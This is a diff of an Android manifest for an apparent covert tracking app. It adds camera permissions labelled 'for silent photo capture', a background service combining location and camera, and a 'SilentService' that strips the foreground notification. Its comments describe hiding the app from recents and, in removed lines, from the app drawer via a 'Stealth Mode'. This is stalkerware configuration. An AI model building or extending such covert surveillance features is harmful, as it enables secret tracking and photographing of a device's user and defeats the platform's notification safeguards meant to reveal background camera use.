@@ -9,16 +9,22 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
+    <!-- Camera (for silent photo capture) -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+
     <!-- Foreground service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
     <!-- Boot + watchdog -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
 
-    <!-- Keep CPU awake -->
+    <!-- Keep CPU awake during capture/send -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <!-- Notifications (Android 13+) -->
@@ -33,14 +39,9 @@
         android:theme="@style/Theme.GPSTracker">
 
         <!--
-            The launcher activity is enabled on install so the user can do
-            first-time setup. After pressing "Activate Stealth Mode" it is
-            disabled programmatically and disappears from the app drawer.
-        -->
-        <!--
-            excludeFromRecents + taskAffinity="" ensures the app is never
-            shown in the recent-apps carousel. finishAndRemoveTask() in
-            MainActivity removes the task immediately on stealth activation.
+            excludeFromRecents + taskAffinity="" means the app never appears
+            in the recent-apps carousel. finishAndRemoveTask() in MainActivity
+            removes the current task immediately after activation.
         -->
         <activity
             android:name=".MainActivity"
@@ -54,11 +55,21 @@
             </intent-filter>
         </activity>
 
+        <!--
+            foregroundServiceType="location|camera" allows the service to use
+            both GPS and the camera while running in the background.
+        -->
         <service
             android:name=".LocationTrackingService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location" />
+            android:foregroundServiceType="location|camera" />
+
+        <!-- Helper that removes the foreground notification from the shade -->
+        <service
+            android:name=".SilentService"
+            android:enabled="true"
+            android:exported="false" />
 
         <receiver
             android:name=".BootReceiver"
